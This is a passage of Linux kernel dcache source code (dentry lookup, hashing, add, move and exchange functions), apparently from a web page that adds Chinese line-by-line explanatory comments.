如果dentry的哈希值与指定的哈希值不匹配 continue; // 继续下一个节点 tlen = dentry-&gt;d_name.len; // 获取dentry的名称长度 tname = dentry-&gt;d_name.name; // 获取dentry的名称 // 我们希望得到一对一致的（name,len） if (read_seqcount_retry(&amp;dentry-&gt;d_seq, seq)) &#123; // 如果序列计数器发生变化 cpu_relax(); // 让出CPU时间片 goto seqretry; // 重新尝试读取序列计数器 &#125; if (parent-&gt;d_op-&gt;d_compare(dentry, tlen, tname, name) != 0) // 如果父级dentry的d_compare函数返回非零值 continue; // 继续下一个节点 *seqp = seq; // 将序列计数器的值赋给seqp指针指向的变量 return dentry; // 返回找到的dentry &#125; return NULL; // 未找到匹配的dentry，返回NULL&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778/** * __d_lookup_rcu - 搜索dentry（有竞争，无存储） * @parent: 父级dentry * @name: 要查找的名称的qstr * @seqp: 返回找到dentry时的d_seq值 * 返回值: dentry，或者NULL * * __d_lookup_rcu是rcu-walk名称解析（无存储路径遍历）设计中的dcache查找函数， * 其设计在Documentation/filesystems/path-lookup.txt中有描述。 * * 这个函数只能在核心vfs中使用。 * * __d_lookup_rcu只能在rcu-walk模式下使用，即在持有vfsmount锁和rcu_read_lock的情况下。 * 返回的dentry不能在没有获取d_lock并检查d_seq序列计数与这里返回的@seq相比较之前存储。 * * 可以使用d_rcu_to_refcount函数对找到的dentry进行引用计数。 * * 或者，可以再次调用__d_lookup_rcu来查找返回的dentry的子节点，只要在查找子节点之后检查其父节点的序列锁。 * 因此，形成了一个交错的序列锁检查，保证了路径遍历的完整性。 * * 注意！调用者在使用返回的dentry状态之前必须检查结果dentry与我们返回的序列号是否匹配！ */struct dentry *__d_lookup_rcu(const struct dentry *parent, const struct qstr *name, unsigned *seqp)&#123; u64 hashlen = name-&gt;hash_len; // 获取name的哈希长度 const unsigned char *str = name-&gt;name; // 获取name的名称字符串 struct hlist_bl_head *b = d_hash(hashlen_hash(hashlen)); // 获取哈希表的头指针 struct hlist_bl_node *node; struct dentry *dentry; /* * 注意：这里与__d_lookup_rcu存在重复，这是为了防止单线程性能退化， * 特别是在smp_rmb（在序列计数器中）开销较大的体系结构上。 * 保持这两个函数同步。 */ if (unlikely(parent-&gt;d_flags &amp; DCACHE_OP_COMPARE)) return __d_lookup_rcu_op_compare(parent, name, seqp); /* * 哈希列表受RCU保护。 * * 在比较候选dentry时，小心使用d_seq，以避免与d_move()竞争。 * * 并发重命名可能会在这里破坏我们的列表遍历，导致找不到我们的dentry，从而导致错误的负结果。 * d_lookup()使用rename_lock序列锁来保护免受并发重命名的影响。 * * 更多细节请参见Documentation/filesystems/path-lookup.txt。 */ hlist_bl_for_each_entry_rcu(dentry, node, b, d_hash) &#123; unsigned seq; /* * dentry序列计数器保护我们免受并发重命名的影响，因此保护了父级和名称字段。 * * 调用者必须执行序列计数器检查，以便对返回的dentry执行有用的操作。 * * 注意！这里使用的是“raw” seqcount_begin。这意味着，如果序列计数器处于序列更改的中间状态， * 我们不会等待序列计数器稳定。如果我们执行了慢速的dentry比较，我们将进行序列重试，直到它稳定下来， * 如果我们最终找到了一个成功的查找，我们实际上希望退出RCU查找。 * * 请注意，raw_seqcount_begin仍然会执行smp_rmb()，因此我们仍然保证-&gt;d_name.name的NUL终止。 */ seq = raw_seqcount_begin(&amp;dentry-&gt;d_seq); // 开始读取序列计数器 if (dentry-&gt;d_parent != parent) // 如果dentry的父级不是指定的parent continue; // 继续下一个节点 if (d_unhashed(dentry)) // 如果dentry未哈希 continue; // 继续下一个节点 if (dentry-&gt;d_name.hash_len != hashlen) // 如果dentry的哈希长度与指定的哈希长度不匹配 continue; // 继续下一个节点 if (dentry_cmp(dentry, str, hashlen_len(hashlen)) != 0) // 如果dentry与指定的名称不匹配 continue; // 继续下一个节点 *seqp = seq; // 将序列计数器的值赋给seqp指针指向的变量 return dentry; // 返回找到的dentry &#125; return NULL; // 未找到匹配的dentry，返回NULL&#125; 123456789101112131415161718192021222324/** * d_lookup - 搜索dentry * @parent: 父级dentry * @name: 要查找的名称的qstr * 返回值: dentry，或者NULL * * d_lookup搜索父级dentry的子节点，查找指定的名称。如果找到dentry，它的引用计数将增加，并返回该dentry。 * 调用者必须使用dput释放使用完毕的dentry。如果dentry不存在，则返回NULL。 */struct dentry *d_lookup(const struct dentry *parent, const struct qstr *name)&#123; struct dentry *dentry; unsigned seq; do &#123; seq = read_seqbegin(&amp;rename_lock); // 开始读取序列计数器 dentry = __d_lookup(parent, name); // 调用__d_lookup函数查找dentry if (dentry) break; &#125; while (read_seqretry(&amp;rename_lock, seq)); // 如果序列计数器发生变化，则重试 return dentry; // 返回找到的dentry&#125;EXPORT_SYMBOL(d_lookup); 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970/** * __d_lookup - search for a dentry (racy) * @parent: parent dentry * @name: qstr of name we wish to find * Returns: dentry, or NULL * * __d_lookup is like d_lookup, however it may (rarely) return a * false-negative result due to unrelated rename activity. * * __d_lookup is slightly faster by avoiding rename_lock read seqlock, * however it must be used carefully, eg. with a following d_lookup in * the case of failure. * * __d_lookup callers must be commented. */struct dentry *__d_lookup(const struct dentry *parent, const struct qstr *name)&#123; unsigned int hash = name-&gt;hash; struct hlist_bl_head *b = d_hash(hash); struct hlist_bl_node *node; struct dentry *found = NULL; struct dentry *dentry; /* * Note: There is significant duplication with __d_lookup_rcu which is * required to prevent single threaded performance regressions * especially on architectures where smp_rmb (in seqcounts) are costly. * Keep the two functions in sync. */ /* * The hash list is protected using RCU. * * Take d_lock when comparing a candidate dentry, to avoid races * with d_move(). * * It is possible that concurrent renames can mess up our list * walk here and result in missing our dentry, resulting in the * false-negative result. d_lookup() protects against concurrent * renames using rename_lock seqlock. * * See Documentation/filesystems/path-lookup.txt for more details. */ rcu_read_lock(); hlist_bl_for_each_entry_rcu(dentry, node, b, d_hash) &#123; if (dentry-&gt;d_name.hash != hash) continue; spin_lock(&amp;dentry-&gt;d_lock); if (dentry-&gt;d_parent != parent) goto next; if (d_unhashed(dentry)) goto next; if (!d_same_name(dentry, parent, name)) goto next; dentry-&gt;d_lockref.count++; found = dentry; spin_unlock(&amp;dentry-&gt;d_lock); break;next: spin_unlock(&amp;dentry-&gt;d_lock); &#125; rcu_read_unlock(); return found;&#125; 12345678910111213141516171819202122/** * d_hash_and_lookup - 对qstr进行哈希然后搜索dentry * @dir: 要搜索的目录 * @name: 要查找的名称的qstr * * 在查找失败时返回NULL；在名称错误时返回ERR_PTR(-error)。 */struct dentry *d_hash_and_lookup(struct dentry *dir, struct qstr *name)&#123; /* * 检查是否有文件系统特定的哈希函数。注意，我们必须先计算标准哈希值， * 因为d_op-&gt;d_hash()函数可能选择保持哈希值不变。 */ name-&gt;hash = full_name_hash(dir, name-&gt;name, name-&gt;len); // 计算标准哈希值 if (dir-&gt;d_flags &amp; DCACHE_OP_HASH) &#123; // 检查是否有文件系统特定的哈希函数 int err = dir-&gt;d_op-&gt;d_hash(dir, name); // 调用文件系统特定的哈希函数 if (unlikely(err &lt; 0)) return ERR_PTR(err); // 返回错误指针 &#125; return d_lookup(dir, name); // 调用d_lookup函数进行查找&#125;EXPORT_SYMBOL(d_hash_and_lookup); // 导出d_hash_and_lookup函数 1234567891011121314151617181920212223242526272829303132333435363738394041424344/* * 当一个文件被删除时，我们有两个选项： * - 将这个dentry转换为一个负的dentry * - 取消哈希这个dentry并释放它 * * 通常情况下，我们只想将其转换为负的dentry，但如果有其他人正在使用该dentry或者inode， * 我们就无法这样做，只能将其从哈希队列中移除，并等待它在没有用户时被删除 *//** * d_delete - 删除一个dentry * @dentry: 要删除的dentry * * 如果可能，将dentry转换为负的dentry，否则从哈希队列中移除它，以便稍后删除 */void d_delete(struct dentry *dentry)&#123; struct inode *inode = dentry-&gt;d_inode; spin_lock(&amp;inode-&gt;i_lock); // 获取inode的自旋锁 spin_lock(&amp;dentry-&gt;d_lock); // 获取dentry的自旋锁 /* * 我们是唯一的用户吗？ */ if (dentry-&gt;d_lockref.count == 1) &#123; dentry-&gt;d_flags &amp;= ~DCACHE_CANT_MOUNT; // 清除dentry的DCACHE_CANT_MOUNT标志位 dentry_unlink_inode(dentry); // 解除dentry与inode的关联 &#125; else &#123; __d_drop(dentry); // 从哈希队列中移除dentry spin_unlock(&amp;dentry-&gt;d_lock); // 释放dentry的自旋锁 spin_unlock(&amp;inode-&gt;i_lock); // 释放inode的自旋锁 &#125;&#125;EXPORT_SYMBOL(d_delete); // 导出d_delete函数，使其可被其他模块使用static void __d_rehash(struct dentry *entry)&#123; struct hlist_bl_head *b = d_hash(entry-&gt;d_name.hash); // 获取哈希桶 hlist_bl_lock(b); // 锁定哈希桶 hlist_bl_add_head_rcu(&amp;entry-&gt;d_hash, b); // 将dentry添加到哈希桶中 hlist_bl_unlock(b); // 解锁哈希桶&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647/** * d_rehash - 将一个条目重新添加到哈希表中 * @entry: 要添加到哈希表的dentry * * 根据dentry的名称将其添加到哈希表中。 */void d_rehash(struct dentry *entry)&#123; spin_lock(&amp;entry-&gt;d_lock); // 获取dentry的自旋锁 __d_rehash(entry); // 调用内部函数将dentry重新添加到哈希表中 spin_unlock(&amp;entry-&gt;d_lock); // 释放dentry的自旋锁&#125;EXPORT_SYMBOL(d_rehash); // 导出d_rehash函数，使其可被其他模块使用static inline unsigned start_dir_add(struct inode *dir)&#123; preempt_disable_nested(); // 禁用抢占，并进入嵌套模式 for (;;) &#123; unsigned n = dir-&gt;i_dir_seq; if (!(n &amp; 1) &amp;&amp; cmpxchg(&amp;dir-&gt;i_dir_seq, n, n + 1) == n) return n; cpu_relax(); // CPU自旋等待 &#125;&#125;static inline void end_dir_add(struct inode *dir, unsigned int n, wait_queue_head_t *d_wait)&#123; smp_store_release(&amp;dir-&gt;i_dir_seq, n + 2); // 存储并释放内存屏障，更新i_dir_seq的值 preempt_enable_nested(); // 启用抢占，并退出嵌套模式 wake_up_all(d_wait); // 唤醒等待队列中的所有进程&#125;static void d_wait_lookup(struct dentry *dentry)&#123; if (d_in_lookup(dentry)) &#123; DECLARE_WAITQUEUE(wait, current); // 声明一个等待队列项 add_wait_queue(dentry-&gt;d_wait, &amp;wait); // 将等待队列项添加到dentry的等待队列中 do &#123; set_current_state(TASK_UNINTERRUPTIBLE); // 设置当前进程的状态为不可中断 spin_unlock(&amp;dentry-&gt;d_lock); // 释放dentry的自旋锁 schedule(); // 进程调度，切换到其他可运行的进程 spin_lock(&amp;dentry-&gt;d_lock); // 获取dentry的自旋锁 &#125; while (d_in_lookup(dentry)); // 当dentry处于查找状态时循环执行 &#125;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109struct dentry *d_alloc_parallel(struct dentry *parent, const struct qstr *name, wait_queue_head_t *wq)&#123; unsigned int hash = name-&gt;hash; struct hlist_bl_head *b = in_lookup_hash(parent, hash); struct hlist_bl_node *node; struct dentry *new = d_alloc(parent, name); struct dentry *dentry; unsigned seq, r_seq, d_seq; if (unlikely(!new)) return ERR_PTR(-ENOMEM);retry: rcu_read_lock(); seq = smp_load_acquire(&amp;parent-&gt;d_inode-&gt;i_dir_seq); r_seq = read_seqbegin(&amp;rename_lock); dentry = __d_lookup_rcu(parent, name, &amp;d_seq); if (unlikely(dentry)) &#123; if (!lockref_get_not_dead(&amp;dentry-&gt;d_lockref)) &#123; rcu_read_unlock(); goto retry; &#125; if (read_seqcount_retry(&amp;dentry-&gt;d_seq, d_seq)) &#123; rcu_read_unlock(); dput(dentry); goto retry; &#125; rcu_read_unlock(); dput(new); return dentry; &#125; if (unlikely(read_seqretry(&amp;rename_lock, r_seq))) &#123; rcu_read_unlock(); goto retry; &#125; if (unlikely(seq &amp; 1)) &#123; rcu_read_unlock(); goto retry; &#125; hlist_bl_lock(b); if (unlikely(READ_ONCE(parent-&gt;d_inode-&gt;i_dir_seq) != seq)) &#123; hlist_bl_unlock(b); rcu_read_unlock(); goto retry; &#125; /* * No changes for the parent since the beginning of d_lookup(). * Since all removals from the chain happen with hlist_bl_lock(), * any potential in-lookup matches are going to stay here until * we unlock the chain. All fields are stable in everything * we encounter. */ hlist_bl_for_each_entry(dentry, node, b, d_u.d_in_lookup_hash) &#123; if (dentry-&gt;d_name.hash != hash) continue; if (dentry-&gt;d_parent != parent) continue; if (!d_same_name(dentry, parent, name)) continue; hlist_bl_unlock(b); /* now we can try to grab a reference */ if (!lockref_get_not_dead(&amp;dentry-&gt;d_lockref)) &#123; rcu_read_unlock(); goto retry; &#125; rcu_read_unlock(); /* * somebody is likely to be still doing lookup for it; * wait for them to finish */ spin_lock(&amp;dentry-&gt;d_lock); d_wait_lookup(dentry); /* * it&#x27;s not in-lookup anymore; in principle we should repeat * everything from dcache lookup, but it&#x27;s likely to be what * d_lookup() would&#x27;ve found anyway. If it is, just return it; * otherwise we really have to repeat the whole thing. */ if (unlikely(dentry-&gt;d_name.hash != hash)) goto mismatch; if (unlikely(dentry-&gt;d_parent != parent)) goto mismatch; if (unlikely(d_unhashed(dentry))) goto mismatch; if (unlikely(!d_same_name(dentry, parent, name))) goto mismatch; /* OK, it *is* a hashed match; return it */ spin_unlock(&amp;dentry-&gt;d_lock); dput(new); return dentry; &#125; rcu_read_unlock(); /* we can&#x27;t take -&gt;d_lock here; it&#x27;s OK, though. */ new-&gt;d_flags |= DCACHE_PAR_LOOKUP; new-&gt;d_wait = wq; hlist_bl_add_head_rcu(&amp;new-&gt;d_u.d_in_lookup_hash, b); hlist_bl_unlock(b); return new;mismatch: spin_unlock(&amp;dentry-&gt;d_lock); dput(dentry); goto retry;&#125;EXPORT_SYMBOL(d_alloc_parallel); 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960/* * - 取消哈希化的dentry * - 检索并清除dentry中的等待队列头 * - 返回等待队列头 */static wait_queue_head_t *__d_lookup_unhash(struct dentry *dentry)&#123; wait_queue_head_t *d_wait; // 等待队列头指针 struct hlist_bl_head *b; // 哈希表头指针 lockdep_assert_held(&amp;dentry-&gt;d_lock); // 断言dentry的锁已经被持有 b = in_lookup_hash(dentry-&gt;d_parent, dentry-&gt;d_name.hash); // 在哈希表中查找dentry的父目录和哈希值对应的表头 hlist_bl_lock(b); // 锁定哈希表 dentry-&gt;d_flags &amp;= ~DCACHE_PAR_LOOKUP; // 清除dentry的标志位 __hlist_bl_del(&amp;dentry-&gt;d_u.d_in_lookup_hash); // 从哈希表中删除dentry d_wait = dentry-&gt;d_wait; // 获取等待队列头 dentry-&gt;d_wait = NULL; // 清空等待队列头 hlist_bl_unlock(b); // 解锁哈希表 INIT_HLIST_NODE(&amp;dentry-&gt;d_u.d_alias); // 初始化dentry的别名哈希链表节点 INIT_LIST_HEAD(&amp;dentry-&gt;d_lru); // 初始化dentry的LRU链表头 return d_wait; // 返回等待队列头&#125;void __d_lookup_unhash_wake(struct dentry *dentry)&#123; spin_lock(&amp;dentry-&gt;d_lock); // 自旋锁住dentry的锁 wake_up_all(__d_lookup_unhash(dentry)); // 唤醒等待队列中的所有进程 spin_unlock(&amp;dentry-&gt;d_lock); // 解锁dentry的锁&#125;EXPORT_SYMBOL(__d_lookup_unhash_wake); // 导出符号__d_lookup_unhash_wake/* 如果inode非空，则持有inode-&gt;i_lock */static inline void __d_add(struct dentry *dentry, struct inode *inode)&#123; wait_queue_head_t *d_wait; // 等待队列头指针 struct inode *dir = NULL; // 目录inode指针 unsigned n; // 目录添加计数器 spin_lock(&amp;dentry-&gt;d_lock); // 自旋锁住dentry的锁 if (unlikely(d_in_lookup(dentry))) &#123; // 如果dentry正在进行查找操作 dir = dentry-&gt;d_parent-&gt;d_inode; // 获取dentry的父目录inode n = start_dir_add(dir); // 开始目录添加操作，返回目录添加计数器 d_wait = __d_lookup_unhash(dentry); // 取消哈希化dentry并获取等待队列头 &#125; if (inode) &#123; unsigned add_flags = d_flags_for_inode(inode); // 获取inode的标志位 hlist_add_head(&amp;dentry-&gt;d_u.d_alias, &amp;inode-&gt;i_dentry); // 将dentry添加到inode的别名哈希链表头 raw_write_seqcount_begin(&amp;dentry-&gt;d_seq); // 开始写序列计数器 __d_set_inode_and_type(dentry, inode, add_flags); // 设置dentry的inode和类型 raw_write_seqcount_end(&amp;dentry-&gt;d_seq); // 结束写序列计数器 fsnotify_update_flags(dentry); // 更新dentry的标志位 &#125; __d_rehash(dentry); // 重新哈希化dentry if (dir) end_dir_add(dir, n, d_wait); // 结束目录添加操作，传入目录inode、目录添加计数器和等待队列头 spin_unlock(&amp;dentry-&gt;d_lock); // 解锁dentry的锁 if (inode) spin_unlock(&amp;inode-&gt;i_lock); // 解锁inode的锁&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859/** * d_add - 将dentry添加到哈希队列 * @entry: 要添加的dentry * @inode: 要附加到此dentry的inode * * 这将entry添加到哈希队列并初始化inode。 * entry实际上是在d_alloc()期间填充的。 */void d_add(struct dentry *entry, struct inode *inode)&#123; if (inode) &#123; security_d_instantiate(entry, inode); // 调用安全函数security_d_instantiate，将entry和inode关联起来 spin_lock(&amp;inode-&gt;i_lock); // 获取inode的锁 &#125; __d_add(entry, inode); // 调用内部函数__d_add，将entry添加到哈希队列中&#125;EXPORT_SYMBOL(d_add); // 导出d_add符号，使其可在其他模块中使用/** * d_exact_alias - 查找并哈希一个确切的未哈希别名 * @entry: 要添加的dentry * @inode: 与此dentry关联的inode * * 如果具有相同名称/父目录和所需inode的未哈希dentry已经存在，则哈希并返回它。否则，返回NULL。 * * 父目录应该被锁定。 */struct dentry *d_exact_alias(struct dentry *entry, struct inode *inode)&#123; struct dentry *alias; // 定义一个别名dentry指针 unsigned int hash = entry-&gt;d_name.hash; // 获取entry的名称哈希值 spin_lock(&amp;inode-&gt;i_lock); // 获取inode的锁 hlist_for_each_entry(alias, &amp;inode-&gt;i_dentry, d_u.d_alias) &#123; // 遍历inode的dentry链表 /* * 这里不需要alias-&gt;d_lock，因为具有d_parent == entry-&gt;d_parent的别名不受名称或父目录更改的影响，因为持有父目录inode i_mutex。 */ if (alias-&gt;d_name.hash != hash) // 如果别名的名称哈希值与entry的不相等，则继续下一次循环 continue; if (alias-&gt;d_parent != entry-&gt;d_parent) // 如果别名的父目录与entry的父目录不相等，则继续下一次循环 continue; if (!d_same_name(alias, entry-&gt;d_parent, &amp;entry-&gt;d_name)) // 如果别名与entry的名称不相同，则继续下一次循环 continue; spin_lock(&amp;alias-&gt;d_lock); // 获取别名的锁 if (!d_unhashed(alias)) &#123; // 如果别名已经被哈希，则解锁并将别名置为NULL spin_unlock(&amp;alias-&gt;d_lock); alias = NULL; &#125; else &#123; __dget_dlock(alias); // 获取别名的引用计数 __d_rehash(alias); // 将别名重新哈希 spin_unlock(&amp;alias-&gt;d_lock); // 解锁别名 &#125; spin_unlock(&amp;inode-&gt;i_lock); // 解锁inode return alias; // 返回找到的别名 &#125; spin_unlock(&amp;inode-&gt;i_lock); // 解锁inode return NULL; // 没有找到匹配的别名，返回NULL&#125;EXPORT_SYMBOL(d_exact_alias); // 导出d_exact_alias符号，使其可在其他模块中使用 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960static void swap_names(struct dentry *dentry, struct dentry *target)&#123; if (unlikely(dname_external(target))) &#123; if (unlikely(dname_external(dentry))) &#123; /* * Both external: swap the pointers */ swap(target-&gt;d_name.name, dentry-&gt;d_name.name); // 交换两个外部名称的指针 &#125; else &#123; /* * dentry:internal, target:external. Steal target&#x27;s * storage and make target internal. */ memcpy(target-&gt;d_iname, dentry-&gt;d_name.name, dentry-&gt;d_name.len + 1); // 将dentry的名称复制到target的内部存储中 dentry-&gt;d_name.name = target-&gt;d_name.name; // 将target的名称指针赋值给dentry target-&gt;d_name.name = target-&gt;d_iname; // 将target的内部存储指针赋值给target的名称指针 &#125; &#125; else &#123; if (unlikely(dname_external(dentry))) &#123; /* * dentry:external, target:internal. Give dentry&#x27;s * storage to target and make dentry internal */ memcpy(dentry-&gt;d_iname, target-&gt;d_name.name, target-&gt;d_name.len + 1); // 将target的名称复制到dentry的内部存储中 target-&gt;d_name.name = dentry-&gt;d_name.name; // 将dentry的名称指针赋值给target dentry-&gt;d_name.name = dentry-&gt;d_iname; // 将dentry的内部存储指针赋值给dentry的名称指针 &#125; else &#123; /* * Both are internal. */ unsigned int i; BUILD_BUG_ON(!IS_ALIGNED(DNAME_INLINE_LEN, sizeof(long))); for (i = 0; i &lt; DNAME_INLINE_LEN / sizeof(long); i++) &#123; swap(((long *) &amp;dentry-&gt;d_iname)[i], ((long *) &amp;target-&gt;d_iname)[i]); // 交换两个内部名称的值 &#125; &#125; &#125; swap(dentry-&gt;d_name.hash_len, target-&gt;d_name.hash_len); // 交换两个名称的哈希长度&#125;static void copy_name(struct dentry *dentry, struct dentry *target)&#123; struct external_name *old_name = NULL; if (unlikely(dname_external(dentry))) old_name = external_name(dentry); // 获取dentry的外部名称指针 if (unlikely(dname_external(target))) &#123; atomic_inc(&amp;external_name(target)-&gt;u.count); // 增加target的外部名称引用计数 dentry-&gt;d_name = target-&gt;d_name; // 将target的名称赋值给dentry的名称 &#125; else &#123; memcpy(dentry-&gt;d_iname, target-&gt;d_name.name, target-&gt;d_name.len + 1); // 将target的名称复制到dentry的内部存储中 dentry-&gt;d_name.name = dentry-&gt;d_iname; // 将dentry的内部存储指针赋值给dentry的名称指针 dentry-&gt;d_name.hash_len = target-&gt;d_name.hash_len; // 将target的名称哈希长度赋值给dentry的名称哈希长度 &#125; if (old_name &amp;&amp; likely(atomic_dec_and_test(&amp;old_name-&gt;u.count))) kfree_rcu(old_name, u.head); // 减少旧的外部名称的引用计数，并在引用计数为0时释放内存&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136/* * __d_move - 移动一个dentry * @dentry: 要移动的dentry * @target: 新的dentry * @exchange: 交换这两个dentry * * 更新dcache以反映文件名的移动。负的dcache条目不应以这种方式移动。调用者必须持有rename_lock、源目录和目标目录的i_mutex，以及如果它们不同，则持有sb-&gt;s_vfs_rename_mutex。参见lock_rename()。 */static void __d_move(struct dentry *dentry, struct dentry *target, bool exchange)&#123; // 声明变量 struct dentry *old_parent, *p; wait_queue_head_t *d_wait; struct inode *dir = NULL; unsigned n; // 检查dentry是否有关联的inode WARN_ON(!dentry-&gt;d_inode); // 检查dentry和target是否相同 if (WARN_ON(dentry == target)) return; // 检查target是否是dentry的祖先 BUG_ON(d_ancestor(target, dentry)); // 保存dentry的旧父目录 old_parent = dentry-&gt;d_parent; // 检查target是否是dentry的祖先或者dentry是否是target的祖先 p = d_ancestor(old_parent, target); // 如果dentry是根目录 if (IS_ROOT(dentry)) &#123; BUG_ON(p); // 锁定target的父目录 spin_lock(&amp;target-&gt;d_parent-&gt;d_lock); &#125; else if (!p) &#123; /* target不是dentry-&gt;d_parent的后代 */ // 锁定target的父目录 spin_lock(&amp;target-&gt;d_parent-&gt;d_lock); // 锁定旧父目录 spin_lock_nested(&amp;old_parent-&gt;d_lock, DENTRY_D_LOCK_NESTED); &#125; else &#123; BUG_ON(p == dentry); // 锁定旧父目录 spin_lock(&amp;old_parent-&gt;d_lock); // 如果p不等于target，则锁定target的父目录 if (p != target) spin_lock_nested(&amp;target-&gt;d_parent-&gt;d_lock, DENTRY_D_LOCK_NESTED); &#125; // 锁定dentry spin_lock_nested(&amp;dentry-&gt;d_lock, 2); // 锁定target spin_lock_nested(&amp;target-&gt;d_lock, 3); // 如果target正在进行查找操作 if (unlikely(d_in_lookup(target))) &#123; // 获取target的父目录的inode dir = target-&gt;d_parent-&gt;d_inode; // 开始目录添加操作 n = start_dir_add(dir); // 获取等待队列头 d_wait = __d_lookup_unhash(target); &#125; // 开始写序列计数 write_seqcount_begin(&amp;dentry-&gt;d_seq); // 开始嵌套写序列计数 write_seqcount_begin_nested(&amp;target-&gt;d_seq, DENTRY_D_LOCK_NESTED); /* 取消哈希两个dentry */ // 如果dentry没有被取消哈希 if (!d_unhashed(dentry)) ___d_drop(dentry); // 如果target没有被取消哈希 if (!d_unhashed(target)) ___d_drop(target); /* ... 并在树中交换它们 */ // 设置dentry的父目录为target的父目录 dentry-&gt;d_parent = target-&gt;d_parent; // 如果不是交换操作 if (!exchange) &#123; // 复制名称 copy_name(dentry, target); // 设置target的哈希前驱为NULL target-&gt;d_hash.pprev = NULL; // 增加dentry的父目录的锁引用计数 dentry-&gt;d_parent-&gt;d_lockref.count++; // 如果dentry不是旧父目录 if (dentry != old_parent) /* 不是IS_ROOT */ // 减少旧父目录的锁引用计数 WARN_ON(!--old_parent-&gt;d_lockref.count); &#125; else &#123; // 设置target的父目录为旧父目录 target-&gt;d_parent = old_parent; // 交换名称 swap_names(dentry, target); // 将target从target的父目录的子目录列表中移动到dentry的父目录的子目录列表中 list_move(&amp;target-&gt;d_child, &amp;target-&gt;d_parent-&gt;d_subdirs); // 重新哈希target __d_rehash(target); // 更新target的标志位 fsnotify_update_flags(target); &#125; // 将dentry从dentry的父目录的子目录列表中移动到target的父目录的子目录列表中 list_move(&amp;dentry-&gt;d_child, &amp;dentry-&gt;d_parent-&gt;d_subdirs); // 重新哈希dentry __d_rehash(dentry); // 更新dentry的标志位 fsnotify_update_flags(dentry); // 处理dentry的移动操作 fscrypt_handle_d_move(dentry); // 结束写序列计数 write_seqcount_end(&amp;target-&gt;d_seq); // 结束写序列计数 write_seqcount_end(&amp;dentry-&gt;d_seq); // 如果dir不为空 if (dir) // 结束目录添加操作 end_dir_add(dir, n, d_wait); // 如果dentry的父目录不等于旧父目录 if (dentry-&gt;d_parent != old_parent) // 解锁dentry的父目录 spin_unlock(&amp;dentry-&gt;d_parent-&gt;d_lock); // 如果dentry不等于旧父目录 if (dentry != old_parent) // 解锁旧父目录 spin_unlock(&amp;old_parent-&gt;d_lock); // 解锁target spin_unlock(&amp;target-&gt;d_lock); // 解锁dentry spin_unlock(&amp;dentry-&gt;d_lock);&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051/* * d_move - 移动一个dentry * @dentry: 要移动的dentry * @target: 新的dentry * * 更新dcache以反映文件名的移动。负的dcache条目不应以这种方式移动。请参阅__d_move的锁定要求。 */void d_move(struct dentry *dentry, struct dentry *target)&#123; write_seqlock(&amp;rename_lock); // 获取重命名锁 __d_move(dentry, target, false); // 调用内部函数__d_move进行移动 write_sequnlock(&amp;rename_lock); // 释放重命名锁&#125;EXPORT_SYMBOL(d_move); // 导出d_move函数/* * d_exchange - 交换两个dentry * @dentry1: 第一个dentry * @dentry2: 第二个dentry */void d_exchange(struct dentry *dentry1, struct dentry *dentry2)&#123; write_seqlock(&amp;rename_lock); // 获取重命名锁 WARN_ON(!dentry1-&gt;d_inode); // 如果dentry1的d_inode为空，则发出警告 WARN_ON(!dentry2-&gt;d_inode); // 如果dentry2的d_inode为空，则发出警告 WARN_ON(IS_ROOT(dentry1)); // 如果dentry1是根目录，则发出警告 WARN_ON(IS_ROOT(dentry2)); // 如果dentry2是根目录，则发出警告 __d_move(dentry1, dentry2, true); // 调用内部函数__d_move进行交换 write_sequnlock(&amp;rename_lock); // 释放重命名锁&#125;/** * d_ancestor - 搜索祖先 * @p1: 祖先dentry * @p2: 子dentry * * 如果p1是p2的祖先，则返回p2的祖先dentry，否则返回NULL。 */struct dentry *d_ancestor(struct dentry *p1, struct dentry *p2)&#123; struct dentry *p; for (p = p2; !IS_ROOT(p); p = p-&gt;d_parent) &#123; // 从p2开始向上遍历dentry的父节点，直到根节点 if (p-&gt;d_parent == p1) // 如果找到p1作为p2的父节点，则返回p2的祖先dentry return p; &#125; return NULL; // 如果p1不是p2的祖先，则返回NULL&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445/* * This helper attempts to cope with remotely renamed directories * 这个辅助函数试图处理远程重命名的目录 * * It assumes that the caller is already holding * dentry-&gt;d_parent-&gt;d_inode-&gt;i_mutex, and rename_lock * 它假设调用者已经持有dentry-&gt;d_parent-&gt;d_inode-&gt;i_mutex和rename_lock * * Note: If ever the locking in lock_rename() changes, then please * remember to update this too... * 注意：如果lock_rename()中的锁定发生变化，请记得更新此处... */static int __d_unalias(struct inode *inode, struct dentry *dentry, struct dentry *alias)&#123; struct mutex *m1 = NULL; // 互斥锁m1 struct rw_semaphore *m2 = NULL; // 读写信号量m2 int ret = -ESTALE; // 返回值，默认为ESTALE /* If alias and dentry share a parent, then no extra locks required */ /* 如果alias和dentry共享一个父节点，则不需要额外的锁 */ if (alias-&gt;d_parent == dentry-&gt;d_parent) goto out_unalias; // 跳转到out_unalias标签 /* See lock_rename() */ /* 参见lock_rename() */ if (!mutex_trylock(&amp;dentry-&gt;d_sb-&gt;s_vfs_rename_mutex)) goto out_err; // 如果无法获取vfs_rename_mutex锁，则跳转到out_err标签 m1 = &amp;dentry-&gt;d_sb-&gt;s_vfs_rename_mutex; // 将vfs_rename_mutex锁赋值给m1 if (!inode_trylock_shared(alias-&gt;d_parent-&gt;d_inode)) goto out_err; // 如果无法获取alias的父节点的inode的共享锁，则跳转到out_err标签 m2 = &amp;alias-&gt;d_parent-&gt;d_inode-&gt;i_rwsem; // 将alias的父节点的inode的读写信号量赋值给m2out_unalias: __d_move(alias, dentry, false); // 调用内部函数__d_move进行移动 ret = 0; // 设置返回值为0，表示成功out_err: if (m2) up_read(m2); // 释放读取锁m2 if (m1) mutex_unlock(m1); // 释放互斥锁m1 return ret; // 返回结果&#125; 